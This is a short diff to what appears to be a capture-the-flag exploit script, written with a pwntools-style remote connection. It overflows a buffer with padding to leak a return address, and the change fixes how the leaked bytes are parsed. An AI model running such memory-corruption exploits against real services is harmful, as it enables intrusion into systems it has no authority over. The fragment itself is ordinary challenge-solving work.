@@ -11,7 +11,7 @@ def solve(r: remote, data: bytes):
     # leak the return address
     msg = b"A" * (OFFSET_BUF1_TO_RETURN_ADDR - 1)
     r.sendline(msg)
-    ret_addr = int.from_bytes(r.recvlinesb(2)[1], byteorder="little")
+    ret_addr = int.from_bytes(r.recvlinesb(2)[1][:8], byteorder="little")
     print(f"original return address: 0x{ret_addr:x}")
 
     r.recvuntil(b"What's the room number? ")
